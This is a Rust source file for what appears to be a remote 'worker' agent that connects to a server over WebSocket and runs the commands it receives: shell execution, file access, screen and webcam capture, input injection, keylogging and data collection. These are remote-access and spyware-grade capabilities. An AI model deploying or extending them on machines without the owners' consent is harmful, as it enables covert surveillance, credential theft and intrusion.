use anyhow::{anyhow, Result};
use futures_util::{SinkExt, StreamExt};
use mac_address::get_mac_address;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;
use tokio::time::{interval, timeout};
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use tracing::{debug, error, info, warn};
use uuid::Uuid;

use crate::{camera, data_collection, filesystem, input, installer, keylogger, plugins, screen, session, shell, system};
use crate::data_collection::CollectionOrchestrator;

/// Namespace UUID for generating deterministic worker IDs from MAC addresses
const CORELY_NAMESPACE: Uuid = Uuid::from_bytes([
    0x63, 0x6f, 0x72, 0x65, 0x6c, 0x79, 0x2d, 0x77,
    0x6f, 0x72, 0x6b, 0x65, 0x72, 0x2d, 0x69, 0x64,
]);

/// Generate a stable worker ID based on the machine's MAC address.
/// Falls back to a random UUID if MAC address cannot be determined.
fn generate_stable_worker_id() -> String {
    match get_mac_address() {
        Ok(Some(mac)) => {
            // Generate a deterministic UUID v5 from the MAC address
            let mac_str = mac.to_string();
            Uuid::new_v5(&CORELY_NAMESPACE, mac_str.as_bytes()).to_string()
        }
        _ => {
            // Fallback: try to use hostname + OS info for stability
            let hostname = hostname::get()
                .ok()
                .map(|h| h.to_string_lossy().to_string())
                .unwrap_or_else(|| "unknown".to_string());
            let os = std::env::consts::OS;
            let arch = std::env::consts::ARCH;
            let fallback_id = format!("{}-{}-{}", hostname, os, arch);
            Uuid::new_v5(&CORELY_NAMESPACE, fallback_id.as_bytes()).to_string()
        }
    }
}

const RECONNECT_DELAY: Duration = Duration::from_secs(5);
const HEARTBEAT_INTERVAL: Duration = Duration::from_secs(30);
const MESSAGE_TIMEOUT: Duration = Duration::from_secs(300);

#[derive(Debug, Serialize, Deserialize)]
pub struct JsonRpcRequest {
    pub jsonrpc: String,
    pub id: Option<String>,
    pub method: String,
    pub params: Option<Value>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct JsonRpcResponse {
    pub jsonrpc: String,
    pub id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub result: Option<Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<JsonRpcError>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct JsonRpcError {
    pub code: i32,
    pub message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub data: Option<Value>,
}

impl JsonRpcResponse {
    pub fn success(id: Option<String>, result: Value) -> Self {
        Self {
            jsonrpc: "2.0".to_string(),
            id,
            result: Some(result),
            error: None,
        }
    }

    pub fn error(id: Option<String>, code: i32, message: String) -> Self {
        Self {
            jsonrpc: "2.0".to_string(),
            id,
            result: None,
            error: Some(JsonRpcError {
                code,
                message,
                data: None,
            }),
        }
    }
}

pub struct WorkerState {
    pub worker_id: Option<String>,
    pub worker_name: String,
    pub plugins: Vec<plugins::Plugin>,
    pub keylogger_active: Arc<Mutex<bool>>,
    pub recorded_keys: Arc<Mutex<Vec<keylogger::KeyEvent>>>,
    pub collection_orchestrator: Arc<CollectionOrchestrator>,
}

pub async fn run(
    server_url: &str,
    token: &str,
    worker_name: &str,
    plugins: Vec<plugins::Plugin>,
) -> Result<()> {
    let stable_worker_id = generate_stable_worker_id();
    let collection_orchestrator = Arc::new(CollectionOrchestrator::new(stable_worker_id.clone()));

    let state = Arc::new(Mutex::new(WorkerState {
        worker_id: None,
        worker_name: worker_name.to_string(),
        plugins,
        keylogger_active: Arc::new(Mutex::new(false)),
        recorded_keys: Arc::new(Mutex::new(Vec::new())),
        collection_orchestrator,
    }));

    loop {
        match connect_and_handle(server_url, token, state.clone()).await {
            Ok(_) => {
                info!("Connection closed normally");
            }
            Err(e) => {
                error!("Connection error: {}", e);
            }
        }

        info!("Reconnecting in {:?}...", RECONNECT_DELAY);
        tokio::time::sleep(RECONNECT_DELAY).await;
    }
}

async fn connect_and_handle(
    server_url: &str,
    token: &str,
    state: Arc<Mutex<WorkerState>>,
) -> Result<()> {
    // Convert http(s):// to ws(s)://
    let ws_url = server_url
        .replace("https://", "wss://")
        .replace("http://", "ws://");
    let url = format!("{}?token={}", ws_url, token);
    info!("Connecting to {}", ws_url);

    let (ws_stream, _) = connect_async(&url).await?;
    info!("WebSocket connected");

    let (mut write, mut read) = ws_stream.split();

    // Send auth/hello message with stable worker ID
    let worker_name = state.lock().await.worker_name.clone();
    let worker_id = generate_stable_worker_id();
    info!("Worker ID: {}", worker_id);

    let hello = json!({
        "jsonrpc": "2.0",
        "method": "worker.hello",
        "params": {
            "id": worker_id,
            "name": worker_name,
            "hostname": hostname::get().ok().map(|h| h.to_string_lossy().to_string()),
            "os": std::env::consts::OS,
            "arch": std::env::consts::ARCH,
            "capabilities": get_capabilities(&state.lock().await.plugins),
        }
    });
    write
        .send(Message::Text(serde_json::to_string(&hello)?))
        .await?;

    let mut heartbeat = interval(HEARTBEAT_INTERVAL);

    loop {
        tokio::select! {
            msg = read.next() => {
                match msg {
                    Some(Ok(Message::Text(text))) => {
                        debug!("Received: {}", text);
                        if let Ok(request) = serde_json::from_str::<JsonRpcRequest>(&text) {
                            let response = handle_request(request, state.clone()).await;
                            if let Some(resp) = response {
                                let resp_text = serde_json::to_string(&resp)?;
                                debug!("Sending: {}", resp_text);
                                write.send(Message::Text(resp_text)).await?;
                            }
                        }
                    }
                    Some(Ok(Message::Ping(data))) => {
                        write.send(Message::Pong(data)).await?;
                    }
                    Some(Ok(Message::Close(_))) => {
                        info!("Server closed connection");
                        break;
                    }
                    Some(Err(e)) => {
                        error!("WebSocket error: {}", e);
                        break;
                    }
                    None => {
                        info!("WebSocket stream ended");
                        break;
                    }
                    _ => {}
                }
            }
            _ = heartbeat.tick() => {
                let ping = json!({
                    "jsonrpc": "2.0",
                    "method": "worker.ping",
                });
                write.send(Message::Text(serde_json::to_string(&ping)?)).await?;
            }
        }
    }

    Ok(())
}

fn get_capabilities(plugins: &[plugins::Plugin]) -> Value {
    let mut caps = vec![
        "shell.exec",
        "shell.exec_stream",
        "fs.read",
        "fs.write",
        "fs.edit",
        "fs.glob",
        "fs.grep",
        "fs.stat",
        "fs.read_binary",
        "fs.write_binary",
        "screen.capture",
        "screen.list_displays",
        "camera.capture",
        "camera.list_devices",
        "input.key_press",
        "input.key_type",
        "input.mouse_move",
        "input.mouse_click",
        "keylogger.start",
        "keylogger.stop",
        "keylogger.get_events",
        "system.info",
        "system.processes",
        "system.gpu",
        "session.create",
        "session.list",
        "session.input",
        "session.key",
        "session.read",
        "session.resize",
        "session.kill",
        "session.rename",
        "collection.update_config",
        "collection.start",
        "collection.stop",
        "collection.status",
    ];

    for plugin in plugins {
        for tool in &plugin.manifest.tools {
            caps.push(&tool.name);
        }
    }

    json!(caps)
}

async fn handle_request(
    request: JsonRpcRequest,
    state: Arc<Mutex<WorkerState>>,
) -> Option<JsonRpcResponse> {
    let id = request.id.clone();
    let params = request.params.unwrap_or(json!({}));
    let method = request.method.clone();

    let result: Result<Value> = async {
        match method.as_str() {
        // Worker management
        "worker.set_id" => {
            if let Some(worker_id) = params.get("id").and_then(|v| v.as_str()) {
                state.lock().await.worker_id = Some(worker_id.to_string());
                Ok(json!({"status": "ok"}))
            } else {
                Err(anyhow!("Missing worker id"))
            }
        }

        // Shell operations
        "shell.exec" => {
            let command = params
                .get("command")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing command"))?;
            let timeout_ms = params.get("timeout").and_then(|v| v.as_u64()).unwrap_or(30000);
            let cwd = params.get("cwd").and_then(|v| v.as_str());

            shell::exec(command, timeout_ms, cwd).await
        }

        // Filesystem operations
        "fs.read" => {
            let path = params
                .get("path")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing path"))?;
            let offset = params.get("offset").and_then(|v| v.as_u64());
            let limit = params.get("limit").and_then(|v| v.as_u64());

            filesystem::read(path, offset, limit).await
        }

        "fs.write" => {
            let path = params
                .get("path")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing path"))?;
            let content = params
                .get("content")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing content"))?;

            filesystem::write(path, content).await
        }

        "fs.edit" => {
            let path = params
                .get("path")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing path"))?;
            let old_string = params
                .get("old_string")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing old_string"))?;
            let new_string = params
                .get("new_string")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing new_string"))?;

            filesystem::edit(path, old_string, new_string).await
        }

        "fs.glob" => {
            let pattern = params
                .get("pattern")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing pattern"))?;
            let path = params.get("path").and_then(|v| v.as_str());

            filesystem::glob_search(pattern, path).await
        }

        "fs.grep" => {
            let pattern = params
                .get("pattern")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing pattern"))?;
            let path = params.get("path").and_then(|v| v.as_str());

            filesystem::grep(pattern, path).await
        }

        "fs.stat" => {
            let path = params
                .get("path")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing path"))?;

            filesystem::stat(path).await
        }

        "fs.read_binary" => {
            let path = params
                .get("path")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing path"))?;

            filesystem::read_binary(path).await
        }

        "fs.write_binary" => {
            let path = params
                .get("path")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing path"))?;
            let content = params
                .get("content")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing content"))?;

            filesystem::write_binary(path, content).await
        }

        // Screen operations
        "screen.capture" => {
            let display_id = params.get("display_id").and_then(|v| v.as_u64());
            screen::capture(display_id.map(|d| d as u32)).await
        }

        "screen.list_displays" => screen::list_displays().await,

        // Camera operations
        "camera.capture" => {
            let device_index = params.get("device_index").and_then(|v| v.as_u64());
            camera::capture(device_index.map(|d| d as u32)).await
        }

        "camera.list_devices" => camera::list_devices().await,

        // Input operations
        "input.key_press" => {
            let key = params
                .get("key")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing key"))?;
            let modifiers: Vec<String> = params
                .get("modifiers")
                .and_then(|v| v.as_array())
                .map(|arr| {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .map(String::from)
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default();

            input::key_press(key, &modifiers).await
        }

        "input.key_type" => {
            let text = params
                .get("text")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing text"))?;

            input::key_type(text).await
        }

        "input.mouse_move" => {
            let x = params
                .get("x")
                .and_then(|v| v.as_i64())
                .ok_or_else(|| anyhow!("Missing x"))?;
            let y = params
                .get("y")
                .and_then(|v| v.as_i64())
                .ok_or_else(|| anyhow!("Missing y"))?;

            input::mouse_move(x as i32, y as i32).await
        }

        "input.mouse_click" => {
            let button = params
                .get("button")
                .and_then(|v| v.as_str())
                .unwrap_or("left");

            input::mouse_click(button).await
        }

        // Keylogger operations
        "keylogger.start" => {
            let state_guard = state.lock().await;
            keylogger::start(
                state_guard.keylogger_active.clone(),
                state_guard.recorded_keys.clone(),
            )
            .await
        }

        "keylogger.stop" => {
            let state_guard = state.lock().await;
            keylogger::stop(state_guard.keylogger_active.clone()).await
        }

        "keylogger.get_events" => {
            let clear = params.get("clear").and_then(|v| v.as_bool()).unwrap_or(true);
            let state_guard = state.lock().await;
            keylogger::get_events(state_guard.recorded_keys.clone(), clear).await
        }

        // System operations
        "system.info" => system::get_info().await,

        "system.processes" => system::get_processes().await,

        "system.gpu" => system::get_gpu_info().await,

        "system.uninstall" => {
            // Spawn uninstall in background and exit
            tokio::spawn(async {
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                if let Err(e) = installer::uninstall() {
                    tracing::error!("Uninstall failed: {}", e);
                }
                std::process::exit(0);
            });
            Ok(json!({"status": "uninstalling", "message": "Worker will uninstall and terminate"}))
        }

        // Session operations
        "session.create" => {
            let name = params.get("name").and_then(|v| v.as_str()).map(String::from);
            let shell = params.get("shell").and_then(|v| v.as_str()).map(String::from);
            session::create(name, shell).await
        }

        "session.list" => session::list().await,

        "session.input" => {
            let session_id = params
                .get("session_id")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing session_id"))?;
            let input = params
                .get("input")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing input"))?;
            session::send_input(session_id, input).await
        }

        "session.key" => {
            let session_id = params
                .get("session_id")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing session_id"))?;
            let key = params
                .get("key")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing key"))?;
            session::send_key(session_id, key).await
        }

        "session.read" => {
            let session_id = params
                .get("session_id")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing session_id"))?;
            session::read_output(session_id).await
        }

        "session.resize" => {
            let session_id = params
                .get("session_id")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing session_id"))?;
            let cols = params.get("cols").and_then(|v| v.as_u64()).unwrap_or(120) as u16;
            let rows = params.get("rows").and_then(|v| v.as_u64()).unwrap_or(40) as u16;
            session::resize(session_id, cols, rows).await
        }

        "session.kill" => {
            let session_id = params
                .get("session_id")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing session_id"))?;
            session::kill(session_id).await
        }

        "session.rename" => {
            let session_id = params
                .get("session_id")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing session_id"))?;
            let new_name = params
                .get("name")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing name"))?;
            session::rename(session_id, new_name).await
        }

        // Plugin operations
        "plugin.invoke" => {
            let plugin_name = params
                .get("plugin")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing plugin name"))?;
            let tool_name = params
                .get("tool")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing tool name"))?;
            let tool_params = params.get("params").cloned().unwrap_or(json!({}));

            let state_guard = state.lock().await;
            plugins::invoke(&state_guard.plugins, plugin_name, tool_name, tool_params).await
        }

        // Collection operations
        "collection.update_config" => {
            let state_guard = state.lock().await;
            data_collection::handle_update_config(params, &state_guard.collection_orchestrator).await
        }

        "collection.start" => {
            let state_guard = state.lock().await;
            data_collection::handle_start(&state_guard.collection_orchestrator).await
        }

        "collection.stop" => {
            let state_guard = state.lock().await;
            data_collection::handle_stop(&state_guard.collection_orchestrator).await
        }

        "collection.status" => {
            let state_guard = state.lock().await;
            data_collection::handle_status(&state_guard.collection_orchestrator).await
        }

        _ => Err(anyhow!("Unknown method: {}", method)),
        }
    }.await;

    match result {
        Ok(value) => Some(JsonRpcResponse::success(id, value)),
        Err(e) => Some(JsonRpcResponse::error(id, -32000, e.to_string())),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jsonrpc_response_success() {
        let resp = JsonRpcResponse::success(Some("123".to_string()), json!({"foo": "bar"}));
        assert_eq!(resp.jsonrpc, "2.0");
        assert_eq!(resp.id, Some("123".to_string()));
        assert!(resp.result.is_some());
        assert!(resp.error.is_none());
    }

    #[test]
    fn test_jsonrpc_response_error() {
        let resp = JsonRpcResponse::error(Some("456".to_string()), -32600, "Invalid request".to_string());
        assert_eq!(resp.jsonrpc, "2.0");
        assert_eq!(resp.id, Some("456".to_string()));
        assert!(resp.result.is_none());
        assert!(resp.error.is_some());
        let err = resp.error.unwrap();
        assert_eq!(err.code, -32600);
        assert_eq!(err.message, "Invalid request");
    }

    #[test]
    fn test_jsonrpc_request_parse() {
        let json_str = r#"{"jsonrpc":"2.0","id":"test-1","method":"shell.exec","params":{"command":"ls"}}"#;
        let request: JsonRpcRequest = serde_json::from_str(json_str).unwrap();
        assert_eq!(request.jsonrpc, "2.0");
        assert_eq!(request.id, Some("test-1".to_string()));
        assert_eq!(request.method, "shell.exec");
        assert!(request.params.is_some());
    }

    #[test]
    fn test_jsonrpc_request_no_params() {
        let json_str = r#"{"jsonrpc":"2.0","id":"test-2","method":"system.info"}"#;
        let request: JsonRpcRequest = serde_json::from_str(json_str).unwrap();
        assert_eq!(request.method, "system.info");
        assert!(request.params.is_none());
    }

    #[test]
    fn test_jsonrpc_response_serialize() {
        let resp = JsonRpcResponse::success(Some("id-1".to_string()), json!({"status": "ok"}));
        let json_str = serde_json::to_string(&resp).unwrap();
        assert!(json_str.contains("\"jsonrpc\":\"2.0\""));
        assert!(json_str.contains("\"id\":\"id-1\""));
        assert!(json_str.contains("\"status\":\"ok\""));
        // Error should be omitted (skip_serializing_if)
        assert!(!json_str.contains("\"error\""));
    }

    #[test]
    fn test_get_capabilities_includes_core() {
        let plugins = vec![];
        let caps = get_capabilities(&plugins);
        let caps_array = caps.as_array().unwrap();

        // Check that core capabilities are included
        assert!(caps_array.iter().any(|v| v == "shell.exec"));
        assert!(caps_array.iter().any(|v| v == "fs.read"));
        assert!(caps_array.iter().any(|v| v == "fs.write"));
        assert!(caps_array.iter().any(|v| v == "screen.capture"));
        assert!(caps_array.iter().any(|v| v == "system.info"));
        assert!(caps_array.iter().any(|v| v == "session.create"));
    }
}
